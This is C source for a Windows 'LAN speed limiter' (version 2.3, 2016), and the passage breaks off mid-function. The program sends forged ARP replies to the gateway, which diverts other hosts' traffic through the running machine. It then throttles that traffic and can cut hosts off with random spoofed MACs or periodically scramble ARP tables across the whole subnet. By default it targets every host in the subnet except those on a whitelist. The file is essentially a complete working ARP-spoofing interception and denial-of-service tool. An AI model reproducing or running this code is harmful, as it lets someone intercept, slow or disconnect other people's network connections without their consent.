#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pcap.h>
#include <conio.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <time.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"pcap.lib")

#define THREADS_MAXIMUM 1000

const char *about_str=\
                      "\n"
                      "\t-------------------------------------------------------------\n"
                      "\t+                                                           +\n"
                      "\t+                   局域网限速（Ver 2.3）                   +\n"
                      "\t+                                                           +\n"
                      "\t+                                                           +\n"
                      "\t+          赠给大学志同道合的基友 坤坤 AND 小张             +\n"
                      "\t+                                                           +\n"
                      "\t+                                             2016.6.21     +\n"
                      "\t+                                             By:Wayne      +\n"
                      "\t-------------------------------------------------------------\n";

const char *config_format=\
                          "[系统配置]\n"
                          "限速模式=1\t\t#1.白名单  2.黑名单\n"
                          "场景模式=1\t\t#1.正常    2.广播域隔离\n"
                          "应答模式=1\t\t#1.主动    2.被动\n"
                          "断网模式=0\t\t#0.否      1.是（随机源MAC地址）\n"
                          "限制总速率=100\t\t#单位：Kb/s\n"
                          "应答间隔=1000\t\t#单位：ms\n"
                          "混淆间隔=300\t\t#单位：s\n"
                          "[主机列表]\n";

typedef struct _System_Config_
{
    int confineMode;   //限速模式
    int sceneMode;     //场景模式
    int respondMode;   //应答模式
    int interval;      //应答间隔
    int messInterval;  //全网扰乱间隔
    int randMAC;       //随机MAC
    int totalSpeed;    //总速率

    char myIPAddress[16];
    unsigned char myMAC[6];
    char gatewayIp[16];
    unsigned char gatewayMAC[6];
    char mask[16];

    pcap_t *hpcap;
} SYS_CON;

typedef struct _Host_Info_
{
    char ip[16];
    unsigned char mac[6];
    int timestamp;
    int alive;
    struct _Host_Info_ *next;
} HOST_INFO;

SYS_CON gl_Sys_Con;
HOST_INFO *glp_Host_List_Header=NULL;
HOST_INFO *glp_custom_List_Header=NULL;
CRITICAL_SECTION cs_flowSpeed;
CRITICAL_SECTION cs_arpCount;
CRITICAL_SECTION cs_threadCount;
unsigned long int arpPacketCount=0;
unsigned long int flowPacketCount=0;
unsigned long int subHostCount=0;
unsigned long int macScanCount=0;
unsigned long int threadCount=0;
double flowSpeed=0;
double recordFlowSpeed=0;
double totalFlowSize=0;

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //以太网目的地址
    unsigned char SrcMAC[6];     //以太网源地址
    unsigned short EtherType;    //帧类型
} DLCHEADER;

typedef struct ARP_Frame
{
    unsigned short HW_Type;       //硬件类型
    unsigned short Prot_Type;     //上层协议类型
    unsigned char HW_Addr_Len;    //MAC地址长度
    unsigned char Prot_Addr_Len;  //IP地址长度
    unsigned short Opcode;        //操作码,01表示请求，02表示应答

    unsigned char Send_HW_Addr[6]; //发送端MAC地址
    unsigned char Send_Prot_Addr[4];   //发送端IP地址
    unsigned char Targ_HW_Addr[6]; //目标MAC地址
    unsigned char Targ_Prot_Addr[4];   //目标IP地址
} ARPFRAME;

typedef struct ipheader
{
    unsigned char ip_hl:4;         /*header length(报头长度）*/
    unsigned char ip_v:4;          /*version(版本)*/
    unsigned char ip_tos;          /*type os service服务类型*/
    unsigned short int ip_len;     /*total length (总长度)*/
    unsigned short int ip_id;      /*identification (标识符)*/
    unsigned short int ip_off;     /*fragment offset field(段移位域)*/
    unsigned char ip_ttl;          /*time to live (生存时间)*/
    unsigned char ip_p;            /*protocol(协议)*/
    unsigned short int ip_sum;     /*checksum(校验和)*/
    unsigned char ip_src[4];       /*source address(源地址)*/
    unsigned char ip_dst[4];       /*destination address(目的地址)*/
} IP;

typedef struct tcpheader
{
    unsigned short int sport;    /*source port (源端口号)*/
    unsigned short int dport;    /*destination port(目的端口号)*/
    unsigned int th_seq;         /*sequence number(包的序列号)*/
    unsigned int th_ack;         /*acknowledgement number(确认应答号)*/
    unsigned char th_x:4;        /*unused(未使用)*/
    unsigned char th_off:4;      /*data offset(数据偏移量)*/
    unsigned char Flags;         /*标志全*/
    unsigned short int th_win;   /*windows(窗口)*/
    unsigned short int th_sum;   /*checksum(校验和)*/
    unsigned short int th_urp;   /*urgent pointer(紧急指针)*/
} TCP;

BOOL GetAdapterInfo(char *ipbuff,char *macbuff,char *gatewayIp)
{
    IP_ADAPTER_INFO AdapterInfo[16];  //定义存储网卡信息的结构数组
    DWORD ArrayLength=sizeof(AdapterInfo);  //缓冲区长度

    memset(gatewayIp,NULL,16);

    if(GetAdaptersInfo(AdapterInfo,&ArrayLength)!=ERROR_SUCCESS)
        return ERROR;
    PIP_ADAPTER_INFO PAdapterInfo=AdapterInfo;

    do
    {
        if(!strcmp(ipbuff,PAdapterInfo->IpAddressList.IpAddress.String)) break; //找到对应网卡
        PAdapterInfo=PAdapterInfo->Next;
    }
    while(PAdapterInfo);
    if(PAdapterInfo==NULL)
    {
        printf("未找到对应网卡IP!\n");
        getch();
        exit(0);
    }
    memset(macbuff,NULL,6);
    memcpy(macbuff,PAdapterInfo->Address,6);         //获取网卡MAC地址
    strcat(gatewayIp,PAdapterInfo->GatewayList.IpAddress.String);

    return TRUE;
}

char *iptos(u_long in)
{
    static char output[12][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == 12 ? 0 : which + 1);
    sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

BOOL ChooseDev(char *devbuff,int buffsize,char *ipbuff)
{
    pcap_if_t *alldevs=NULL,*d=NULL;
    char errbuf[PCAP_ERRBUF_SIZE+1];
    char source[PCAP_ERRBUF_SIZE+1];
    int i,choose;
    pcap_addr_t *a=NULL;

    memset(devbuff,NULL,buffsize);
    memset(ipbuff,NULL,16);
    memset(source,NULL,sizeof(source));
    memset(errbuf,NULL,sizeof(errbuf));

    strcat(source,"1");
    source[PCAP_ERRBUF_SIZE]='\0';

    if(pcap_findalldevs_ex(source,NULL,&alldevs,errbuf) == -1)
    {
        fprintf(stderr,"error in pcap_findalldevs_ex.\n",errbuf);
        exit(1);
    }
    for(d=alldevs,i=1; d!=NULL; d=d->next,i++)
    {
        //设备名
        printf("%d:%s\n",i,d->name);

        //设备描述
        if(d->description)
            printf("Description: %s\n",d->description);
        //loopback address
        printf("Loopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");

        //IP address
        for(a=d->addresses; a!=NULL; a=a->next)
        {
            printf("Address Family: #%d\n",a->addr->sa_family);

            switch(a->addr->sa_family)
            {
            case AF_INET:
                printf("Address Family Name: AF_INET.\n");
                if (a->addr)
                    printf("Address: %s\n",iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
                if (a->netmask)
                    printf("Netmask: %s\n",iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
                if (a->broadaddr)
                    printf("Broadcast Address: %s\n",iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
                if (a->dstaddr)
                    printf("Destination Address: %s\n",iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
                break;
            case AF_INET6:
                printf("Address Family Name: AF_INET6\n");
                break;
            default:
                printf("Address Family Name: Unknown\n");
                break;
            }
        }
        printf("------------------------------------------------------\n");
    }

    do
    {
        printf("请选择一个网卡:");
        fflush(stdin);
    }
    while(scanf("%d",&choose)!=1 || choose<1 ||choose>i);

    for(d=alldevs,i=1; i<choose; d=d->next,i++);
    for(a=d->addresses; a!=NULL; a=a->next)
    {
        if(a->addr && a->addr->sa_family==AF_INET)
        {
            strcat(devbuff,d->name);
            strcat(ipbuff,iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
            strcat(gl_Sys_Con.mask,iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
        }
    }
    pcap_freealldevs(alldevs);

    return TRUE;
}

int rand_mac_addr(char *pmac)
{
    int i;

    memset(pmac,NULL,6);

    for(i=0; i<6; i++)
    {
        pmac[i]=rand()%255;
    }

    return 0;
}

void Fill_ARPPACKET(char *ARPPacket,int packetsize,char *desmac,char *desIP,char *srcmac,char *srcip,int op)
{
    /*
        *ARPPacket    指向将要填充的数据包指针
         packetsize   数据包大小
        *desmac 指向存有目标MAC的缓冲区地址
        *desIP  指向存有目标IP的缓冲区地址
        *srcmac 指向存有来源MAC的缓冲区地址
        *srcip  指向存有来源IP的缓冲区地址
         op     ARP包类型
        */
    unsigned long tmpIp;
    DLCHEADER *DLCHeader=(DLCHEADER *)ARPPacket;
    ARPFRAME *ARPFrame=(ARPFRAME *)(ARPPacket+sizeof(DLCHEADER));

    memset(ARPPacket,NULL,packetsize);  //清空包内容

//填充以太网目的地址
    if(op==1)    //表示ARP请求包.
    {
        memset(DLCHeader->DesMAC,0xff,6);    //用ffffffffffff填充以太网头目的MAC地址。
        tmpIp=inet_addr(desIP);
        memcpy(ARPFrame->Targ_Prot_Addr,(char *)&tmpIp,4);
    }
    else
    {
        memcpy(DLCHeader->DesMAC,desmac,6);
        tmpIp=inet_addr(desIP);
        memcpy(ARPFrame->Targ_Prot_Addr,(char *)&tmpIp,4);
        memcpy(ARPFrame->Targ_HW_Addr,DLCHeader->DesMAC,6);
    }

    //填充以太网源地址
    memcpy(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6);
    memcpy(ARPFrame->Send_HW_Addr,srcmac,6);
    //填充ARP包源IP
    tmpIp=inet_addr(srcip);
    memcpy(ARPFrame->Send_Prot_Addr,(char *)&tmpIp,4);
    DLCHeader->EtherType=htons((unsigned short)0x0806);    //0x0806表示ARP协议，0x0800表示IP协议
    ARPFrame->HW_Addr_Len=(unsigned char)6;
    ARPFrame->Prot_Addr_Len=(unsigned char)4;
    ARPFrame->HW_Type=htons((unsigned short)1);
    ARPFrame->Opcode=htons((unsigned short)op);   //01表示请求，02表示应答
    ARPFrame->Prot_Type=htons((unsigned short)0x0800);

    return;
}

int print_lock=0;

int bind_arp_list()
{
    FILE *cmdRes=NULL;
    int idx=-1;
    char result[2000];
    char *p1=NULL,*p2=NULL;

    system("arp -d");
    cmdRes=popen("netsh interface ipv4 show neighbors","r");
    while(!feof(cmdRes))
    {
        memset(result,NULL,sizeof(result));
        fgets(result,sizeof(result)-1,cmdRes);
        p2=strchr(result,':');
        if(p2!=NULL)
        {
            p1=p2;
            for(p1--; *p1>='0' && *p1<='9'; p1--);
            p1++;
            *p2=NULL;
            idx=atoi(p1);
        }
        p1=strstr(result,gl_Sys_Con.gatewayIp);
        if(p1!=NULL)
        {
            sprintf(result,"netsh interface ipv4 set neighbors %d \"%s\" \"%02x-%02x-%02x-%02x-%02x-%02x\" store=active",idx,\
                    gl_Sys_Con.gatewayIp,gl_Sys_Con.gatewayMAC[0],gl_Sys_Con.gatewayMAC[1],gl_Sys_Con.gatewayMAC[2],\
                    gl_Sys_Con.gatewayMAC[3],gl_Sys_Con.gatewayMAC[4],gl_Sys_Con.gatewayMAC[5]);
            system(result);
            pclose(cmdRes);

            cmdRes=popen(result,"r");
            memset(result,NULL,sizeof(result)-1);
            fgets(result,sizeof(result)-1,cmdRes);
            if(strlen(result)>5)
            {
                puts("请以管理员权限运行此程序！\n");
                print_lock=1;
                getch();
                exit(0);

            }
            pclose(cmdRes);

            return 0;
        }
    }
    pclose(cmdRes);

    return 0;
}

DWORD WINAPI respond_arp_thread(LPVOID para)
{
    int i,n;
    char ARPPacket[60];
    char *pIp=(char *)para;
    char srcMAC[6];

    for(i=1,n=0; n<20; n++)
    {
        if(!memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC)))
        {
            memset(ARPPacket,NULL,sizeof(ARPPacket));
            memset(srcMAC,NULL,sizeof(srcMAC));
            if(gl_Sys_Con.randMAC)
            {
                rand_mac_addr(srcMAC);
            }
            else
            {
                memcpy(srcMAC,gl_Sys_Con.myMAC,6);
            }
            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                           srcMAC,pIp,2);
            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
            EnterCriticalSection(&cs_arpCount);
            arpPacketCount++;
            LeaveCriticalSection(&cs_arpCount);
        }
        Sleep(1);
    }

    free(para);
    EnterCriticalSection(&cs_threadCount);
    threadCount--;
    LeaveCriticalSection(&cs_threadCount);

    return 0;
}

int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt_data)
{
    int i;
    char *Packet=NULL;
    char tmpIp[16];
    char *pIp=NULL;
    DLCHEADER *DLCHeader=NULL;
    IP *IPHeader=NULL;
    ARPFRAME *ARPHeader=NULL;
    HOST_INFO *pNode=NULL;

    Packet=pkt_data;

    if(pkthdr->caplen<sizeof(DLCHEADER)) return -1;
    DLCHeader=(DLCHEADER *)Packet;

    if(strncmp(DLCHeader->DesMAC,gl_Sys_Con.myMAC,6))
    {
        //不是发往本机MAC
        //检测是否是广播地址
        for(i=0; i<6; i++)
        {
            if(DLCHeader->DesMAC[i]!=0xff)
            {
                return 0;
            }
        }
    }

    if(!strncmp(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6))
    {
        //本机发送出去的
        return 0;
    }

    //printf("%d %d\n",pkthdr->caplen,pkthdr->len);

    if(ntohs(DLCHeader->EtherType)==0x0806)
    {
        //接收到ARP协议包
        if(pkthdr->caplen<sizeof(DLCHEADER)+sizeof(ARPFRAME)) return -1;
        ARPHeader=(ARPFRAME *)(Packet+sizeof(DLCHEADER));

        if(ARPHeader->Opcode==htons(2))
        {
            //接收到应答包
            memset(tmpIp,NULL,sizeof(tmpIp));
            strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));  //解析源IP
            if(!strcmp(tmpIp,gl_Sys_Con.gatewayIp))
            {
                //接收到网关MAC地址
                if(memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC)))
                {
                    memcpy(gl_Sys_Con.gatewayMAC,ARPHeader->Send_HW_Addr,6);
                    bind_arp_list();
                }
                return 0;
            }

            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
            {
                if(!strcmp(tmpIp,pNode->ip))
                {
                    //更新链表中的ARP对应表
                    pNode->alive=1;
                    memcpy(pNode->mac,ARPHeader->Send_HW_Addr,6);
                    pNode->timestamp=time(NULL);
                    return 0;
                }
            }
        }
        else
        {
            //接收到ARP请求包
            if(!strncmp(gl_Sys_Con.gatewayMAC,ARPHeader->Send_HW_Addr,6))
            {
                //是来自网关的请求
                pIp=(char *)malloc(16);
                if(pIp==NULL) return -1;
                memset(pIp,NULL,16);
                //被请求的IP
                strcat(pIp,inet_ntoa(*(struct in_addr *)ARPHeader->Targ_Prot_Addr));

                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                {
                    if(!strcmp(pIp,pNode->ip))
                    {
                        pNode->timestamp=time(NULL);
                        pNode->alive=1;
                        break;
                    }
                }
                if(pNode!=NULL)
                {
                    //应答请求包
                    EnterCriticalSection(&cs_threadCount);
                    if(threadCount<THREADS_MAXIMUM)
                    {
                        CloseHandle(CreateThread(NULL,0,respond_arp_thread,(LPVOID)pIp,0,NULL));
                        threadCount++;
                    }
                    else
                    {
                        free(pIp);
                    }
                    LeaveCriticalSection(&cs_threadCount);
                    //puts(pIp);
                }
                else
                {
                    free(pIp);
                }
            }
            else
            {
                //来自其它主机的请求
                memset(tmpIp,NULL,sizeof(tmpIp));
                strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));  //解析源IP

                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                {
                    if(!strcmp(tmpIp,pNode->ip))
                    {
                        pNode->timestamp=time(NULL);
                        pNode->alive=1;
                        memcpy(pNode->mac,ARPHeader->Send_HW_Addr,6);
                        break;
                    }
                }
            }
        }
    }
    else if(ntohs(DLCHeader->EtherType)==0x0800)
    {
        //接收到IP数据包
        if(pkthdr->caplen<sizeof(DLCHEADER)+sizeof(IP)) return -1;

        IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
        memset(tmpIp,NULL,sizeof(tmpIp));
        strcat(tmpIp,inet_ntoa(*(struct in_addr *)IPHeader->ip_dst));
        if(strcmp(tmpIp,gl_Sys_Con.myIPAddress))
        {
            //目标IP不是本机
            //欺骗过来的流量，需要转发
            ++flowPacketCount;
            if((int)flowSpeed<gl_Sys_Con.totalSpeed*1024)
            {
                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                {
                    if(!strcmp(tmpIp,pNode->ip) && !memory_empty(pNode->mac,6))
                    {
                        //找到转发对应表
                        memcpy(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6);
                        memcpy(DLCHeader->DesMAC,pNode->mac,6);
                        SendPacket(gl_Sys_Con.hpcap,Packet,pkthdr->caplen);
                        EnterCriticalSection(&cs_flowSpeed);
                        flowSpeed+=pkthdr->caplen;
                        LeaveCriticalSection(&cs_flowSpeed);
                        totalFlowSize+=pkthdr->caplen;
                        //printf("转发长度:%d\tTo:%s\tMAC:%02x-%02x-%02x-%02x-%02x-%02x\tmyMAC:%02x-%02x-%02x-%02x-%02x-%02x\n",pkthdr->caplen,tmpIp,\
                        pNode->mac[0],pNode->mac[1],pNode->mac[2],pNode->mac[3],pNode->mac[4],pNode->mac[5],\
                        gl_Sys_Con.myMAC[0],gl_Sys_Con.myMAC[1],gl_Sys_Con.myMAC[2],gl_Sys_Con.myMAC[3],gl_Sys_Con.myMAC[4],\
                        gl_Sys_Con.myMAC[5]);
                        break;
                    }
                }
            }
        }
    }

    return 0;
}

int sniffer()
{
    pcap_loop(gl_Sys_Con.hpcap,-1,deal_packet,NULL);

    return 0;
}

BOOL SendPacket(pcap_t *hpcap,char *Packet,int packetsize)
{
    if(pcap_sendpacket(hpcap,Packet,packetsize)!=0)
    {
        printf("数据包发送失败。\n");
        return ERROR;
    }
    return TRUE;
}


pcap_t *OpenAdapter(char *devName)
{
    pcap_t *hpcap=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];

    if((hpcap=pcap_open_live(devName,        // 设备名
                             65536,          // 指定要捕捉的数据包的部分,65536 保证所有在链路层上的包都能够被抓到
                             1,    		     // 混杂模式
                             0,         	 // 读数据的超时时间
                             errbuf          // 错误缓冲区
                            ))==NULL)
    {
        printf("打开网卡出错。\n");
        return NULL;
    }

    return hpcap;
}

int create_configure_file()
{
    FILE *file=NULL;

    file=fopen("config.ini","w");
    if(file==NULL)
    {
        printf("创建'config.ini'文件失败！\n");
        getch();
        return -1;
    }
    fputs(config_format,file);
    fflush(file);
    fclose(file);

    return 0;
}

int about()
{
    char choose;

    system("color a");
    printf("%s\n",about_str);
    printf("\n1.开始限速    2.编辑配置文件    3.生成配置文件\n");
reselect:
    fflush(stdin);
    choose=getch();
    switch(choose)
    {
    case '1':
        break;
    case '2':
        if(access("config.ini",0)!=0)
        {
            if(create_configure_file()!=0)
            {
                exit(-1);
            }
        }
        system("config.ini");
        goto reselect;
        break;
    case '3':
        if(create_configure_file()!=0)
        {
            printf("生成配置文件失败！\n");
            getch();
            exit(0);
        }
        printf("已生成配置文件'config.ini'\n");
        goto reselect;
        break;
    default:
        goto reselect;
    }

    return 0;
}

int init_config()
{
    FILE *file=NULL;
    char readBuf[1000];
    char title[1000];
    char *p1=NULL,*p2=NULL;
    HOST_INFO *pNode=NULL,*pNew=NULL;

    memset(&gl_Sys_Con,NULL,sizeof(gl_Sys_Con));

    if(access("config.ini",0)!=0)
    {
        printf("配置文件不存在，请先选择生成！\n");
        getch();
        exit(-1);
    }
    file=fopen("config.ini","r");
    if(file==NULL)
    {
        return -1;
    }
    while(!feof(file))
    {
        memset(readBuf,NULL,sizeof(readBuf));
        fgets(readBuf,sizeof(readBuf)-1,file);
        if(readBuf[0]=='[')
        {
            memset(title,NULL,sizeof(title));
            strncat(title,&readBuf[1],strlen(readBuf)-3);
        }
        else if(!strcmp("系统配置",title))
        {
            p1=strchr(readBuf,'=');
            if(!strncmp("限速模式",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.confineMode=atoi(p1);
            }
            else if(!strncmp("场景模式",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.sceneMode=atoi(p1);
            }
            else if(!strncmp("应答模式",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.respondMode=atoi(p1);
            }
            else if(!strncmp("断网模式",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.randMAC=atoi(p1);
            }
            else if(!strncmp("应答间隔",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.interval=atoi(p1);
            }
            else if(!strncmp("混淆间隔",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.messInterval=atoi(p1);
            }
            else if(!strncmp("限制总速率",readBuf,p1-readBuf))
            {
                p1++;
                p2=strchr(p1,'\t');
                if(p2==NULL || p1==p2) return -1;
                *p2=NULL;
                gl_Sys_Con.totalSpeed=atoi(p1);
            }
        }
        else if(!strcmp("主机列表",title))
        {
            if(readBuf[strlen(readBuf)-1]=='\n')
                readBuf[strlen(readBuf)-1]=NULL;
            if(strlen(readBuf)<5) continue;
            pNew=(HOST_INFO *)malloc(sizeof(HOST_INFO));
            if(pNew==NULL) return -1;
            memset(pNew,NULL,sizeof(HOST_INFO));

            strcat(pNew->ip,readBuf);
            if(glp_custom_List_Header==NULL)
            {
                glp_custom_List_Header=pNew;
            }
            else
            {
                for(pNode=glp_custom_List_Header; pNode->next!=NULL; pNode=pNode->next);
                pNode->next=pNew;
            }
        }
    }
    fclose(file);

    return 0;
}

/*测试主网和子网是否匹配，也可测试两个主机IP是否在同一网段内*/
int netIPAndSubnetValid(char *strIp,char *strSubip,char *strMask)
{
    int addr1,addr2;
    unsigned int IP,subIP,mask;

    IP=inet_addr(strIp);
    subIP=inet_addr(strSubip);
    mask=inet_addr(strMask);

    addr1=IP & mask;
    addr2=subIP & mask;

    if(addr1!=addr2)
        return 0;

    return 1;
}

int init_host_list()
{
    char ipPrefix[16],ip[16];
    char *p=NULL;
    int i,j,writeList=0;
    int tmpIndex[4];
    HOST_INFO *pNode=NULL,*pNode2=NULL;

    memset(ipPrefix,NULL,sizeof(ipPrefix));

    strcat(ipPrefix,gl_Sys_Con.myIPAddress);
    p=strrchr(ipPrefix,'.');
    if(p==NULL) return -1;
    *p=NULL;
    p=strrchr(ipPrefix,'.');
    *p=NULL;

    if(gl_Sys_Con.confineMode==1)
    {
        //白名单模式
        for(tmpIndex[2]=0; tmpIndex[2]<=255; tmpIndex[2]++)
            for(tmpIndex[3]=1; tmpIndex[3]<255; tmpIndex[3]++)
            {
                memset(ip,NULL,sizeof(ip));

                //生成新IP地址
                sprintf(ip,"%s.%d.%d",ipPrefix,tmpIndex[2],tmpIndex[3]);

                //是否和本机处于同一子网
                if(!netIPAndSubnetValid(ip,gl_Sys_Con.myIPAddress,gl_Sys_Con.mask))
                {
                    continue;
                }
                subHostCount++;

                //检测是不是网关或本机IP
                if(!strcmp(ip,gl_Sys_Con.gatewayIp) || !strcmp(ip,gl_Sys_Con.myIPAddress))
                {
                    continue;
                }

                //检测是不是白名单IP
                for(pNode2=glp_custom_List_Header,writeList=0; pNode2!=NULL; pNode2=pNode2->next)
                {
                    if(!strcmp(ip,pNode2->ip))
                    {
                        writeList=1;
                        break;
                    }
                    else
                    {
                        writeList=0;
                    }
                }
                if(writeList) continue;

                //加入到探测列表中
                if(glp_Host_List_Header==NULL)
                {
                    glp_Host_List_Header=(HOST_INFO *)malloc(sizeof(HOST_INFO));
                    if(glp_Host_List_Header==NULL) return -1;

                    pNode=glp_Host_List_Header;
                }
                else
                {
                    for(pNode=glp_Host_List_Header; pNode->next!=NULL; pNode=pNode->next);
                    pNode->next=(HOST_INFO *)malloc(sizeof(HOST_INFO));
                    if(pNode->next==NULL) return -1;

                    pNode=pNode->next;
                }
                memset(pNode,NULL,sizeof(HOST_INFO));
                strcat(pNode->ip,ip);
            }

    }
    else
    {
        glp_Host_List_Header=glp_custom_List_Header;
    }

    return 0;
}

DWORD WINAPI scan_host_mac_thread(LPVOID para)
{
    char ARPPacket[60];
    HOST_INFO *pNode=NULL;

    while(1)
    {
        if(memory_empty(gl_Sys_Con.gatewayMAC,6))
        {
            //询问网关MAC
            memset(ARPPacket,NULL,sizeof(ARPPacket));
            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,gl_Sys_Con.gatewayIp,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
        }

        //扫描目标主机MAC
        for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
        {
            if(pNode->alive)
            {
                if(!memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>60*5)
                {
                    //有应答主机条目超过5分钟失效
                    memset(pNode->mac,NULL,6);
                    pNode->alive=0;
                }
                else if(memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>60*10)
                {
                    //无应答主机条目10分钟失效
                    memset(pNode->mac,NULL,6);
                    pNode->alive=0;
                }
            }

            if(!(gl_Sys_Con.randMAC && gl_Sys_Con.sceneMode==2))
            {
                memset(ARPPacket,NULL,sizeof(ARPPacket));
                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,pNode->ip,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                Sleep(2);
            }
        }
        macScanCount++;

        Sleep(5000);
    }

    return 0;
}

DWORD WINAPI flow_clear_thread(LPVOID para)
{
    while(1)
    {
        Sleep(1000);
        EnterCriticalSection(&cs_flowSpeed);
        recordFlowSpeed=flowSpeed;
        flowSpeed=0;
        LeaveCriticalSection(&cs_flowSpeed);
    }
    return 0;
}

int memory_empty(char *str,int size)
{
    int i;

    for(i=0; i<size; i++)
        if(str[i]!=NULL)
            return 0;

    return 1;
}

DWORD WINAPI arp_spoof_thread(LPVOID para)
{
    int i;
    HOST_INFO *pNode=NULL;
    char ARPPacket[60];
    int timestamp_1=0;
    clock_t timestamp_2=0;
    char srcMAC[6];

    while(memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC))) Sleep(100);

    while(1)
    {
        if(time(NULL)-timestamp_1>gl_Sys_Con.messInterval)
        {
            //扰乱局域网路由表
            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
            {
                //发送给网关
                memset(ARPPacket,NULL,sizeof(ARPPacket));
                memset(srcMAC,NULL,sizeof(srcMAC));
                rand_mac_addr(srcMAC);

                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                               srcMAC,pNode->ip,2);
                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                arpPacketCount++;
                Sleep(1);

                //以广播请求方式发送给主机
                memset(ARPPacket,NULL,sizeof(ARPPacket));
                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,pNode->ip,\
                               srcMAC,gl_Sys_Con.gatewayIp,1);
                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                arpPacketCount++;
                Sleep(1);
            }
            timestamp_1=time(NULL);
        }

        //欺骗网关
        if(clock()-timestamp_2>gl_Sys_Con.interval)
        {
            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
            {
                if(gl_Sys_Con.sceneMode==2 || pNode->alive)
                {
                    //存活即欺骗
                    memset(ARPPacket,NULL,sizeof(ARPPacket));
                    memset(srcMAC,NULL,sizeof(srcMAC));
                    if(gl_Sys_Con.randMAC)
                    {
                        rand_mac_addr(srcMAC);
                    }
                    else
                    {
                        memcpy(srcMAC,gl_Sys_Con.myMAC,6);
                    }
                    Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                                   srcMAC,pNode->ip,2);
                    SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                    arpPacketCount++;
                    Sleep(1);
                }
            }
            timestamp_2=clock();
        }

        Sleep(1);
    }

    return 0;
}

DWORD WINAPI arp_protect_thread(LPVOID para)
{
    char ARPPacket[60];
    clock_t timestamp = 0;

    while(1)
    {
        if(clock()-timestamp>gl_Sys_Con.interval)
        {
            memset(ARPPacket,NULL,sizeof(ARPPacket));

            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                           gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,2);
            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
            arpPacketCount++;
            timestamp=clock();
        }
        Sleep(1);
    }

    return 0;
}

DWORD WINAPI print_log_thread(LPVOID para)
{
    int aliveCount,n,notResHost;
    HOST_INFO *pNode=NULL;

    while(1)
    {
        for(aliveCount=notResHost=n=0,pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
        {
            if(pNode->alive)
            {
